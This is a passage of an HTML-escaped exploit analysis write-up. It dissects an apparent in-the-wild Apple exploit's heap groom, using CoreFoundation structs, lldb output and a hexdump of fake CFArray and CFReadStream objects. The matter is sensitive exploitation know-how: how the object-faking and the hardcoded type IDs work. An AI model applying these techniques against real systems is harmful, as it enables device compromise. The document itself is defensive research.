 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;typedef&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__CFRuntimeBase&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;uintptr_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_cfisa;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_cfinfo[4];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;#if&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__LP64__&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_rc;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;#endif&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFRuntimeBase;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;So the header is an Objective-C &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://alwaysprocessing.blog/2023/01/19/objc-class-isa&quot;&gt;isa&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer followed by four bytes of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;_cfinfo&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;followed by a reference count. Taking a closer look at the uses of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__cfinfo&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CF_INLINE&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFTypeID&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__CFGenericTypeID_inline(const&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*cf)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;yes,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;bits&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;masked&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;off,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;though&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;bits&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;are&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;there&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;field;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__CFRuntimeClassTableSize&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;1024&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*cfinfop&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(uint32_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*)&amp;amp;(((CFRuntimeBase&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;*)cf)-&amp;gt;_cfinfo);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFTypeID&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;typeID&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(*cfinfop&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;8)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;0x03FF;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;mask&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;up&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;0x0FFF&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;typeID;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It seems that the second byte in &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__cfinfo&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a type identifier. And indeed, running &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;expr (int) CFArrayGetTypeID()&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;lldb&lt;/span&gt;&lt;span&gt;&amp;nbsp;prints: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;19&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;) which matches up with both the object found in the coredump as well as the strange (or now not so strange) object in the TIFF strip buffer.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.rn1kanz6est3&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;X steps forwards, Y steps back&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Looking through more of the CoreFoundation code it seems that the object in the TIFF strip buffer is a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;with inline storage containing one element with the value &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1234abcd&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. It also seems that it&amp;#39;s possible for CF objects to have NULL isa pointers, which explains why the first 8 bytes of the fake object are zero.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;This is interesting, but it still doesn&amp;#39;t actually get us any closer to figuring out what the next step of the exploit actually is. If the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;is meant to overlap with something, then what? And what interesting side-effects could having an &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;with only a single element with the value &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1234abcd&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;possibly have?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;This seems like one step forward and two steps back, but there&amp;#39;s something else which we can now figure out: what that 1MB groom object actually is. Let&amp;#39;s take a look at the start of it again:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000000 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000010 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;80 26 00 00 01 00 00 00 &amp;nbsp;|.........&amp;amp;......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000020 &amp;nbsp;1f 00 00 00 00 00 00 00 &amp;nbsp;10 00 8b 56 02 00 00 00 &amp;nbsp;|...........V....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000030 &amp;nbsp;b0 c3 31 16 02 00 00 00 &amp;nbsp;48 e3 01 00 00 00 00 00 &amp;nbsp;|..1.....H.......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000040 &amp;nbsp;20 ec 46 58 02 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;| .FX............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000050 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000060 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;60 bf 31 16 02 00 00 00 &amp;nbsp;|........`.1.....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000070 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It looks like another CF object, starting at &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;+0x10&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the buffer with the same NULL isa pointer, a reference count of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;and a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__cfinfo&lt;/span&gt;&lt;span&gt;&amp;nbsp;of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;{0x80, 0x26, 0, 0}&lt;/span&gt;&lt;span&gt;. The type identifiers aren&amp;#39;t actually fixed, they&amp;#39;re allocated dynamically via calls to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;_CFRuntimeRegisterClass&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;like this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFTypeID&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFArrayGetTypeID(void)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;dispatch_once_t&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;initOnce;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;dispatch_once(&amp;amp;initOnce,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;^{&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__kCFArrayTypeID&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_CFRuntimeRegisterClass(&amp;amp;__CFArrayClass);&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;});&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__kCFArrayTypeID;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFTypeID&lt;/span&gt;&lt;span&gt;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;are really just indexes into the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__CFRuntimeClassTable&lt;/span&gt;&lt;span&gt;&amp;nbsp;array, and even though the types are allocated dynamically the ordering seems sufficiently stable that the hardcoded type values in the exploit work. &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x26&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFTypeID&lt;/span&gt;&lt;span&gt;&amp;nbsp;for &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_CFStream&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFRuntimeBase&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;_cfBase;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CFOptionFlags&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;flags;&lt;/span&gt;&lt;/p&gt;
